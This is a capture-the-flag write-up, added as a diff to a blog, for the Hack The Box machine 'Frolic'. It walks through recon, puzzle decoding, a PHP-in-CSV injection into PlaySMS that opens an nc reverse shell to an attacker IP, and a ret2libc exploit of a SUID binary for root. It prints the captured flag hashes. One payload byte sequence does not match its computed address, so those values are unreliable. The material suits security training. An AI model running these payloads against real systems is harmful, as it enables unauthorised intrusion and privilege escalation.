@@ -1,0 +1,528 @@
+---
+layout: default
+title: Frolic
+---
+
+<div class="pretty-font">
+<h1>Frolic</h1>
+<p class="date">23/03/2019</p>
+
+<img class="img-fluid" src="/static/img/htb/frolic/frolic.png">
+
+<p>To get user on Frolic we will have to see a couple of esoteric programming languages and exploit a simple file upload vulnerability. Then, to get root, we just have to make a ROP exploit to escalate privileges.</p>
+
+<div class="flexcontainer">
+    <a class="link-box" href="#user">User</a>
+    <a class="link-box" href="#privesc">Privilege Escalation</a>
+</div>
+
+<hr>
+
+<h2 id="user">User</h2>
+
+<p>First run <code>nmap</code> and see we have a bunch of ports open.</p>
+
+<pre class="prettyprint">
+root@kali:~/htb/frolic# nmap -sC -sV 10.10.10.111
+Starting Nmap 7.70 ( https://nmap.org ) at 2019-02-12 07:56 UTC
+Nmap scan report for 10.10.10.111
+Host is up (0.19s latency).
+Not shown: 996 closed ports
+PORT     STATE SERVICE     VERSION
+22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 87:7b:91:2a:0f:11:b6:57:1e:cb:9f:77:cf:35:e2:21 (RSA)
+|   256 b7:9b:06:dd:c2:5e:28:44:78:41:1e:67:7d:1e:b7:62 (ECDSA)
+|_  256 21:cf:16:6d:82:a4:30:c3:c6:9c:d7:38:ba:b5:02:b0 (ED25519)
+139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+445/tcp  open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
+9999/tcp open  http        nginx 1.10.3 (Ubuntu)
+|_http-server-header: nginx/1.10.3 (Ubuntu)
+|_http-title: Welcome to nginx!
+Service Info: Host: FROLIC; OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Host script results:
+|_clock-skew: mean: -1h49m59s, deviation: 3h10m30s, median: 0s
+|_nbstat: NetBIOS name: FROLIC, NetBIOS user: &lt;unknown>, NetBIOS MAC: &lt;unknown> (unknown)
+| smb-os-discovery: 
+|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
+|   Computer name: frolic
+|   NetBIOS computer name: FROLIC\x00
+|   Domain name: \x00
+|   FQDN: frolic
+|_  System time: 2019-02-12T13:26:44+05:30
+| smb-security-mode: 
+|   account_used: guest
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: disabled (dangerous, but default)
+| smb2-security-mode: 
+|   2.02: 
+|_    Message signing enabled but not required
+| smb2-time: 
+|   date: 2019-02-12 07:56:44
+|_  start_date: N/A
+</pre>
+
+<p>In <code>http://10.10.10.111:9999</code> we have an <code>nginx</code> default page, so let's run <code>gobuster</code> to try to find some web content.</p>
+
+<pre class="prettyprint">
+root@kali:~/htb/frolic# /opt/gobuster/gobuster -w /usr/share/wordlists/dirb/common.txt -u http://10.10.10.111:9999/
+
+=====================================================
+Gobuster v2.0.1              OJ Reeves (@TheColonial)
+=====================================================
+[+] Mode         : dir
+[+] Url/Domain   : http://10.10.10.111:9999/
+[+] Threads      : 10
+[+] Wordlist     : /usr/share/wordlists/dirb/common.txt
+[+] Status codes : 200,204,301,302,307,403
+[+] Timeout      : 10s
+=====================================================
+2019/02/12 07:59:20 Starting gobuster
+=====================================================
+/.hta (Status: 403)
+/.htaccess (Status: 403)
+/.htpasswd (Status: 403)
+/admin (Status: 301)
+/backup (Status: 301)
+/dev (Status: 301)
+/test (Status: 301)
+=====================================================
+2019/02/12 08:00:18 Finished
+=====================================================
+</pre>
+
+<p>In <code>/test</code> we have the php details, nothing interesting.</p>
+
+<img class="img-fluid" src="/static/img/htb/frolic/1.png">
+
+<p>In <code>/admin</code> we have a quite strange login panel.</p>
+
+<img class="img-fluid" src="/static/img/htb/frolic/2.png">
+
+<p>Looking at the source code we can see the credentials are hardcoded there.</p>
+
+<pre class="prettyprint">
+var attempt = 3; // Variable to count number of attempts.
+// Below function Executes on click of login button.
+function validate(){
+var username = document.getElementById("username").value;
+var password = document.getElementById("password").value;
+if ( username == "admin" && password == "superduperlooperpassword_lol"){
+alert ("Login successfully");
+window.location = "success.html"; // Redirecting to other page.
+return false;
+}
+else{
+attempt --;// Decrementing by one.
+alert("You have left "+attempt+" attempt;");
+// Disabling fields after 3 attempts.
+if( attempt == 0){
+document.getElementById("username").disabled = true;
+document.getElementById("password").disabled = true;
+document.getElementById("submit").disabled = true;
+return false;
+}
+}
+}
+</pre>
+
+<p>Using <code>admin/superduperlooperpassword_lol</code> in the login panel we get redirected to <code>/admin/success.html</code> where we have the following text.</p>
+
+<pre class="prettyprint">
+..... ..... ..... .!?!! .?... ..... ..... ...?. ?!.?. ..... ..... ..... ..... ..... ..!.? ..... ..... .!?!! .?... ..... ..?.? !.?.. ..... ..... ....! ..... ..... .!.?. ..... .!?!! .?!!! !!!?. ?!.?! !!!!! !...! ..... ..... .!.!! !!!!! !!!!! !!!.? ..... ..... ..... ..!?! !.?!! !!!!! !!!!! !!!!? .?!.? !!!!! !!!!! !!!!! .?... ..... ..... ....! ?!!.? ..... ..... ..... .?.?! .?... ..... ..... ...!. !!!!! !!.?. ..... .!?!! .?... ...?. ?!.?. ..... ..!.? ..... ..!?! !.?!! !!!!? .?!.? !!!!! !!!!. ?.... ..... ..... ...!? !!.?! !!!!! !!!!! !!!!! ?.?!. ?!!!! !!!!! !!.?. ..... ..... ..... .!?!! .?... ..... ..... ...?. ?!.?. ..... !.... ..... ..!.! !!!!! !.!!! !!... ..... ..... ....! .?... ..... ..... ....! ?!!.? !!!!! !!!!! !!!!! !?.?! .?!!! !!!!! !!!!! !!!!! !!!!! .?... ....! ?!!.? ..... .?.?! .?... ..... ....! .?... ..... ..... ..!?! !.?.. ..... ..... ..?.? !.?.. !.?.. ..... ..!?! !.?.. ..... .?.?! .?... .!.?. ..... .!?!! .?!!! !!!?. ?!.?! !!!!! !!!!! !!... ..... ...!. ?.... ..... !?!!. ?!!!! !!!!? .?!.? !!!!! !!!!! !!!.? ..... ..!?! !.?!! !!!!? .?!.? !!!.! !!!!! !!!!! !!!!! !.... ..... ..... ..... !.!.? ..... ..... .!?!! .?!!! !!!!! !!?.? !.?!! !.?.. ..... ....! ?!!.? ..... ..... ?.?!. ?.... ..... ..... ..!.. ..... ..... .!.?. ..... ...!? !!.?! !!!!! !!?.? !.?!! !!!.? ..... ..!?! !.?!! !!!!? .?!.? !!!!! !!.?. ..... ...!? !!.?. ..... ..?.? !.?.. !.!!! !!!!! !!!!! !!!!! !.?.. ..... ..!?! !.?.. ..... .?.?! .?... .!.?. ..... ..... ..... .!?!! .?!!! !!!!! !!!!! !!!?. ?!.?! !!!!! !!!!! !!.!! !!!!! ..... ..!.! !!!!! !.?. 
+</pre>
+
+<p>This is some <code>Ook!</code> code, which is an esoteric programming language.</p>
+
+<p class="challenge-description">It is identical to Brainfuck, except that the instructions are changed into Orangutan words.<br>
+<a href="https://esolangs.org/wiki/ook!" target="_blank">https://esolangs.org/wiki/ook!</a></p>
+
+<p>We can use <a href="https://www.dcode.fr/ook-language" target="_blank">this page</a> to decode it and get this text.</p>
+
+<pre class="prettyprint">
+Nothing here check /asdiSIAJJ0QWE9JAS
+</pre>
+
+<p>If we go to <code>http://10.10.10.111:9999/asdiSIAJJ0QWE9JAS/</code> we find this base64 message.</p>
+
+<pre class="prettyprint">
+UEsDBBQACQAIAMOJN00j/lsUsAAAAGkCAAAJABwAaW5kZXgucGhwVVQJAAOFfKdbhXynW3V4CwAB BAAAAAAEAAAAAF5E5hBKn3OyaIopmhuVUPBuC6m/U3PkAkp3GhHcjuWgNOL22Y9r7nrQEopVyJbs K1i6f+BQyOES4baHpOrQu+J4XxPATolb/Y2EU6rqOPKD8uIPkUoyU8cqgwNE0I19kzhkVA5RAmve EMrX4+T7al+fi/kY6ZTAJ3h/Y5DCFt2PdL6yNzVRrAuaigMOlRBrAyw0tdliKb40RrXpBgn/uoTj lurp78cmcTJviFfUnOM5UEsHCCP+WxSwAAAAaQIAAFBLAQIeAxQACQAIAMOJN00j/lsUsAAAAGkC AAAJABgAAAAAAAEAAACkgQAAAABpbmRleC5waHBVVAUAA4V8p1t1eAsAAQQAAAAABAAAAABQSwUG AAAAAAEAAQBPAAAAAwEAAAAA 
+</pre>
+
+<p>If we decode it we get a zip archive.</p>
+
+<pre class="prettyprint">
+root@kali:~/htb/frolic# echo -n UEsDBBQACQAI... | base64 -d > caca
+root@kali:~/htb/frolic# file caca
+caca: Zip archive data, at least v2.0 to extract
+</pre>
+
+<p>It is password protected but we can easily brute force the password using <code>fcrackzip</code>.</p>
+
+<pre class="prettyprint">
+root@kali:~/htb/frolic# fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt caca 
+
+PASSWORD FOUND!!!!: pw == password
+</pre>
+
+<p>Using <code>password</code> as password (very clever!) we get a php file.</p>
+
+<pre class="prettyprint">
+root@kali:~/htb/frolic# unzip caca
+Archive:  caca
+[caca] index.php password: 
+  inflating: index.php   
+</pre>
+
+<p>But it's not php code, it's some sort of hex value.</p>
+
+<pre class="prettyprint">
+root@kali:~/htb/frolic# cat index.php 
+4b7973724b7973674b7973724b7973675779302b4b7973674b7973724b7973674b79737250463067506973724b7973674b7934744c5330674c5330754b7973674b7973724b7973674c6a77720d0a4b7973675779302b4b7973674b7a78645069734b4b797375504373674b7974624c5434674c53307450463067506930744c5330674c5330754c5330674c5330744c5330674c6a77724b7973670d0a4b317374506973674b79737250463067506973724b793467504373724b3173674c5434744c53304b5046302b4c5330674c6a77724b7973675779302b4b7973674b7a7864506973674c6930740d0a4c533467504373724b3173674c5434744c5330675046302b4c5330674c5330744c533467504373724b7973675779302b4b7973674b7973385854344b4b7973754c6a776743673d3d0d0a
+</pre>
+
+<p>Translate it to ascii and get another <code>base64</code>.</p>
+
+<pre class="prettyprint">
+root@kali:~/htb/frolic# cat index.php | xxd -r -p
+KysrKysgKysrKysgWy0+KysgKysrKysgKysrPF0gPisrKysgKy4tLS0gLS0uKysgKysrKysgLjwr
+KysgWy0+KysgKzxdPisKKysuPCsgKytbLT4gLS0tPF0gPi0tLS0gLS0uLS0gLS0tLS0gLjwrKysg
+K1stPisgKysrPF0gPisrKy4gPCsrK1sgLT4tLS0KPF0+LS0gLjwrKysgWy0+KysgKzxdPisgLi0t
+LS4gPCsrK1sgLT4tLS0gPF0+LS0gLS0tLS4gPCsrKysgWy0+KysgKys8XT4KKysuLjwgCg==
+</pre>
+
+<p>Decode it and get more strange characters.</p>
+
+<pre class="prettyprint">
+root@kali:~/htb/frolic# echo -n KysrKysgKysrKysgWy0+KysgKysrKysgKysrPF0gPisrKysgKy4tLS0gLS0uKysgKysrKysgLjwrKysgWy0+KysgKzxdPisKKysuPCsgKytbLT4gLS0tPF0gPi0tLS0gLS0uLS0gLS0tLS0gLjwrKysgK1stPisgKysrPF0gPisrKy4gPCsrK1sgLT4tLS0KPF0+LS0gLjwrKysgWy0+KysgKzxdPisgLi0tLS4gPCsrK1sgLT4tLS0gPF0+LS0gLS0tLS4gPCsrKysgWy0+KysgKys8XT4KKysuLjwgCg== | base64 -d
++++++ +++++ [->++ +++++ +++<] >++++ +.--- --.++ +++++ .<+++ [->++ +<]>+
+++.<+ ++[-> ---<] >---- --.-- ----- .<+++ +[->+ +++<] >+++. <+++[ ->---
+<]>-- .<+++ [->++ +<]>+ .---. <+++[ ->--- <]>-- ----. <++++ [->++ ++<]>
+++..< 
+</pre>
+
+<p>Those characters are some Brainfuck code, we can decode it using <a href="https://www.dcode.fr/brainfuck-language
+" target="_blank">this page</a> and get the following text.</p>
+
+<pre class="prettyprint">
+idkwhatispass
+</pre>
+
+<p>After this trip through esoteric languages and having, what it seems to be, a password, we can continue with the result of <code>gobuster</code> and check <code>/backup</code> directory.</p>
+
+<pre class="prettyprint">
+root@kali:~/htb/frolic# curl http://10.10.10.111:9999/backup/
+password.txt
+user.txt
+loop/
+</pre>
+
+<p>We have some credentials <code>admin/imnothuman</code> in those files.</p>
+
+<pre class="prettyprint">
+root@kali:~/htb/frolic# curl http://10.10.10.111:9999/backup/password.txt
+password - imnothuman
+root@kali:~/htb/frolic# curl http://10.10.10.111:9999/backup/user.txt
+user - admin
+root@kali:~/htb/frolic# curl http://10.10.10.111:9999/backup/loop/
+&lt;html>
+&lt;head>&lt;title>403 Forbidden&lt;/title>&lt;/head>
+&lt;body bgcolor="white">
+&lt;center>&lt;h1>403 Forbidden&lt;/h1>&lt;/center>
+&lt;hr>&lt;center>nginx/1.10.3 (Ubuntu)&lt;/center>
+&lt;/body>
+&lt;/html>
+</pre>
+
+<p>We'll run <code>gobuster</code> again to see if there's something under <code>/dev</code> directory.</p>
+
+<pre class="prettyprint">
+root@kali:~/htb/frolic# /opt/gobuster/gobuster -w /usr/share/wordlists/dirb/common.txt -u http://10.10.10.111:9999/dev/
+
+=====================================================
+Gobuster v2.0.1              OJ Reeves (@TheColonial)
+=====================================================
+[+] Mode         : dir
+[+] Url/Domain   : http://10.10.10.111:9999/dev/
+[+] Threads      : 10
+[+] Wordlist     : /usr/share/wordlists/dirb/common.txt
+[+] Status codes : 200,204,301,302,307,403
+[+] Timeout      : 10s
+=====================================================
+2019/02/12 08:16:53 Starting gobuster
+=====================================================
+/.hta (Status: 403)
+/.htaccess (Status: 403)
+/.htpasswd (Status: 403)
+/backup (Status: 301)
+/test (Status: 200)
+=====================================================
+2019/02/12 08:17:50 Finished
+=====================================================
+</pre>
+
+<p>In <code>/dev/test</code> we just have the word <code>test</code>, nothing useful.</p>
+
+<pre class="prettyprint">
+root@kali:~/htb/frolic# curl http://10.10.10.111:9999/dev/test
+test
+</pre>
+
+<p>In <code>/dev/backup</code> we have the name of a directory <code>/playsms</code>.</p>
+
+<pre class="prettyprint">
+root@kali:~/htb/frolic# curl http://10.10.10.111:9999/dev/backup/
+/playsms
+</pre>
+
+<p>If we access to <code>http://10.10.10.111:9999/playsms</code> we get a login panel.</p>
+
+<img class="img-fluid" src="/static/img/htb/frolic/3.png">
+
+<p>We can login with the password we found before <code>admin/idkwhatispass</code>.</p>
+
+<img class="img-fluid" src="/static/img/htb/frolic/4.png">
+
+<p>PlaySMS is a Web-based mobile portal system and, we could say after a quick Google search, contains numerous vulnerabilities.</p>
+
+<p>We're going to exploit a file upload remote code execution vulnerability, which is caused by improper file contents handling.</p>
+
+<p>We have to go to <code>My account -> Phonebook -> Import button</code> (<code>http://10.10.10.111:9999/playsms/index.php?app=main&inc=feature_phonebook&route=import&op=list</code>).</p>
+
+<p>We're going to create a malicious csv file which will execute <code>whoami</code> in the machine.</p>
+
+<pre class="prettyprint">
+root@kali:~/htb/frolic# echo -ne 'Name,Mobile,Email\n&lt;?php echo system("whoami") ?>,66,22' > caca.csv
+</pre>
+
+<p>After upload it, we can see the following confirmation where we have the output from <code>whoami</code>.</p>
+
+<img class="img-fluid" src="/static/img/htb/frolic/5.png">
+
+<p>Now instead of running <code>whoami</code> we will make a reverse shell.</p>
+
+<pre class="prettyprint">
+root@kali:~/htb/frolic# echo -ne 'Name,Mobile,Email\n&lt;?php echo system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.16.35 6969 >/tmp/f") ?>,66,22' > caca.csv
+</pre>
+
+<p>If we listen on the specified port we get a shell as <code>www-data</code>.</p>
+
+<pre class="prettyprint">
+root@kali:~/htb/frolic# nc -nlvp 6969
+Ncat: Version 7.70 ( https://nmap.org/ncat )
+Ncat: Listening on :::6969
+Ncat: Listening on 0.0.0.0:6969
+Ncat: Connection from 10.10.10.111.
+Ncat: Connection from 10.10.10.111:54158.
+/bin/sh: 0: can't access tty; job control turned off
+$ 
+</pre>
+
+<p>We can read the user flag which is in ayush home directory.</p>
+
+<pre class="prettyprint">
+$ cat /home/ayush/user.txt
+<span flag="2ab95909cf509f85a6f476b59a0c2fe0">XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX</span>
+</pre>
+
+<h2 id="privesc">Privilege Escalation</h2>
+
+<p>In ayush <code>.binary</code> directory we have a strange binary with the SUID flag set, which means it will run with the permissions of its owner (root).</p>
+
+<pre class="prettyprint">
+$ ls -la /home/ayush/.binary   
+total 16
+drwxrwxr-x 2 ayush ayush 4096 Sep 25 02:43 .
+drwxr-xr-x 3 ayush ayush 4096 Sep 25 02:00 ..
+-rwsr-xr-x 1 root  root  7480 Sep 25 00:59 rop
+</pre>
+
+<p>The usage is simple, we have to pass a string as argument and it will be sent somewhere.</p>
+
+<pre class="prettyprint">
+$ ./rop
+[*] Usage: program &lt;message>
+$ ./rop holi
+[+] Message sent: holi
+</pre>
+
+<p>We're sending the binary to our local machine to make a proper inspection.</p>
+
+<pre class="prettyprint">
+$ python -m SimpleHTTPServer 6666
+</pre>
+
+<pre class="prettyprint">
+root@kali:~/htb/frolic# wget 10.10.10.111:6666/rop
+</pre>
+
+<p>As its filename suggests, we're going to probably have to make a ROP (Return-Oriented Programming) exploit.</p>
+
+<p>The first thing we have to check is if we pass an enough large parameter, the program exits with a <code>Segmentation fault</code> error.</p> 
+
+<pre class="prettyprint">
+root@kali:~/htb/frolic# ./rop aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+Segmentation fault
+</pre>
+
+<p>We're going to create a pattern to determine the exact offset with <code>pattern_create.rb</code> and <code>pattern_offset.rb</code> metasploit scripts.</p>
+
+<pre class="prettyprint">
+root@kali:~/htb/frolic# /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 100
+Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
+</pre>
+
+<p>I'm debugging the binary with <code>gdb-peda</code>, but there are plenty of debuggers such as <code>r2</code> available.</p>
+
+<p>Run the binary with the pattern we have just created.</p>
+
+<pre class="prettyprint">
+root@kali:~/htb/frolic# gdb rop
+gdb-peda$ run Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
+</pre>
+
+<p>We can see the execution failed because it tried to jump to an unknown memory address (<code>0x62413762</code>).</p>
+
+<pre class="prettyprint">
+EIP: 0x62413762 ('b7Ab')
+</pre>
+
+<p>This value is part of our pattern and using <code>pattern_offset.rb</code> we can calculate the exact offset, which is <b>52</b>.</p>
+
+<pre class="prettyprint">
+root@kali:~/htb/frolic# /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 100 -q b7Ab
+[*] Exact match at offset 52
+</pre>
+
+<p>Now we control the value of the <code>EIP</code> register and therefore the execution flow of the program.</p>
+
+<p>We can test this by sending 52 bytes of junk (<code>A</code>) and 4 bytes that are going to be the <code>EIP</code> value at some point (<code>B</code>).</p>
+
+<pre class="prettyprint">
+gdb-peda$ run `python -c "print 'A'*52 + 'B'*4"`
+</pre>
+
+<p>When the program crashes we can see it tried to jump to <code>0x42424242</code> (<code>BBBB</code>) as we expected.</p>
+
+<pre class="prettyprint">
+EIP: 0x42424242 ('BBBB')
+</pre>
+
+<p>Because we have the no-execute (<code>NX</code>) bit set, we can't execute code in certain areas of memory being unable to load our code, that's why we will make a ROP exploit, executing code that is already present in memory.</p>
+
+<pre class="prettyprint">
+gdb-peda$ checksec
+CANARY    : disabled
+FORTIFY   : disabled
+NX        : ENABLED
+PIE       : disabled
+RELRO     : Partial
+</pre>
+
+<p>What we're going to do is make the program execute <code>system("/bin/sh")</code> to get a shell. To do that we need the address of the <code>system</code> function and the address of a <code>"/bin/sh"</code> string variable to pass it as argument. We're also getting the <code>exit</code> function address to make the program exit correctly. We could just put some junk there instead like <code>'BBBB'</code>, in that case the program would jump to <code>0x42424242</code> after calling <code>system("/bin/sh")</code> and crash, but we don't mind here. Anyway, we're doing it right and calling <code>exit</code>.</p>
+
+<pre class="prettyprint">
+gdb-peda$ break main
+gdb-peda$ run
+gdb-peda$ print system
+$1 = {&lt;text variable, no debug info>} 0xf7e02b30 &lt;system>
+gdb-peda$ print exit
+$2 = {&lt;text variable, no debug info>} 0xf7df5b30 &lt;exit>
+gdb-peda$ find "/bin/sh"
+Searching for '/bin/sh' in: None ranges
+Found 1 results, display max 1 items:
+libc : 0xf7f42aaa ("/bin/sh")
+</pre>
+
+<p>These are the addresses I got (could be different in another machine).</p>
+
+<pre class="prettyprint">
+system: 0xf7e02b30
+exit: 0xf7df5b30
+"/bin/sh": 0xf7f42aaa
+</pre>
+
+<p>To test it locally we have to disable Address Space Layout Randomization (<code>ASLR</code>) because if not the addresses could change on runtime.</p>
+
+<pre class="prettyprint">
+root@kali:~/htb/frolic# echo 0 > /proc/sys/kernel/randomize_va_space
+</pre>
+
+<p>Use the addresses obtained to make the payload and we should get our shell.</p>
+
+<p class="challenge-description">PAYLOAD = <code>offset</code> + <code>@system</code> + <code>@exit</code> + <code>@params</code></p>
+
+<pre class="prettyprint">
+root@kali:~/htb/frolic# ./rop `python -c "print 'A'*52 + '\x30\x2b\xe0\xf7' + '\x30\x5b\xdf\xf7' + '\xaa\x2a\xf4\xf7'"`
+# id
+uid=0(root) gid=0(root) groups=0(root)
+</pre>
+
+<p>Now that we know it works we can turn on <code>ASLR</code> again.</p>
+
+<pre class="prettyprint">
+root@kali:~/htb/frolic# echo 2 > /proc/sys/kernel/randomize_va_space
+</pre>
+
+<p>To make the exploit work in frolic we have to change the addresses to its corresponding ones in this machine. We can see the binary is using <code>libc.so.6</code> in <code>0xb7e19000</code>.</p> 
+
+<pre class="prettyprint">
+$ ldd rop
+	linux-gate.so.1 =>  (0xb7fda000)
+	libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0xb7e19000)
+	/lib/ld-linux.so.2 (0xb7fdb000)
+</pre>
+
+<p>Since we don't have <code>gdb</code> here, we can use <code>readelf</code>, <code>strings</code> and <code>grep</code> to find the addresses of <code>system</code>, <code>exit</code> and <code>"/bin/sh"</code> in <code>libc.so.6</code>.</p>
+
+<pre class="prettyprint">
+$ readelf -s /lib/i386-linux-gnu/libc.so.6 | grep "system"
+   245: 00112f20    68 FUNC    GLOBAL DEFAULT   13 svcerr_systemerr@@GLIBC_2.0
+   627: 0003ada0    55 FUNC    GLOBAL DEFAULT   13 __libc_system@@GLIBC_PRIVATE
+  1457: 0003ada0    55 FUNC    WEAK   DEFAULT   13 system@@GLIBC_2.0
+
+$ readelf -s /lib/i386-linux-gnu/libc.so.6 | grep "exit"
+   112: 0002edc0    39 FUNC    GLOBAL DEFAULT   13 __cxa_at_quick_exit@@GLIBC_2.10
+   141: 0002e9d0    31 FUNC    GLOBAL DEFAULT   13 exit@@GLIBC_2.0
+   450: 0002edf0   197 FUNC    GLOBAL DEFAULT   13 __cxa_thread_atexit_impl@@GLIBC_2.18
+   558: 000b07c8    24 FUNC    GLOBAL DEFAULT   13 _exit@@GLIBC_2.0
+   616: 00115fa0    56 FUNC    GLOBAL DEFAULT   13 svc_exit@@GLIBC_2.0
+   652: 0002eda0    31 FUNC    GLOBAL DEFAULT   13 quick_exit@@GLIBC_2.10
+   876: 0002ebf0    85 FUNC    GLOBAL DEFAULT   13 __cxa_atexit@@GLIBC_2.1.3
+  1046: 0011fb80    52 FUNC    GLOBAL DEFAULT   13 atexit@GLIBC_2.0
+  1394: 001b2204     4 OBJECT  GLOBAL DEFAULT   33 argp_err_exit_status@@GLIBC_2.1
+  1506: 000f3870    58 FUNC    GLOBAL DEFAULT   13 pthread_exit@@GLIBC_2.0
+  2108: 001b2154     4 OBJECT  GLOBAL DEFAULT   33 obstack_exit_failure@@GLIBC_2.0
+  2263: 0002e9f0    78 FUNC    WEAK   DEFAULT   13 on_exit@@GLIBC_2.0
+  2406: 000f4c80     2 FUNC    GLOBAL DEFAULT   13 __cyg_profile_func_exit@@GLIBC_2.2
+
+$ strings -tx /lib/i386-linux-gnu/libc.so.6 | grep "/bin/sh"
+ 15ba0b /bin/sh
+</pre>
+
+<p>We have to add to these addresses the address of <code>libc.so.6</code> and we get the following values.</p>
+
+<pre class="prettyprint">
+system: 0xb7e19000 + 0x0003ada0 = 0xB7E53DA0
+exit: 0xb7e19000 + 0x0002e9d0 = 0xB7E479D0
+"/bin/sh": 0xb7e19000 + 0x15ba0b = 0xB7F74A0B
+</pre>
+
+<p>Running the binary in the same way we did before but with the obtained addresses will get us a root shell.</p>
+
+<pre class="prettyprint">
+$ ./rop `python -c "print 'A'*52 + '\xa0\x3d\xe5\xb7' + '\xd0\x79\xe4\xb4' + '\x0b\x4a\xf7\xb7'"`
+id
+uid=0(root) gid=33(www-data) groups=33(www-data)
+</pre>
+
+<p>The root flag is in root's directory.</p>
+
+<pre class="prettyprint">
+cat /root/root.txt
+<span flag="85d3fdf03f969892538ba9a731826222">XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX</span>
+</pre>
+
+</div>
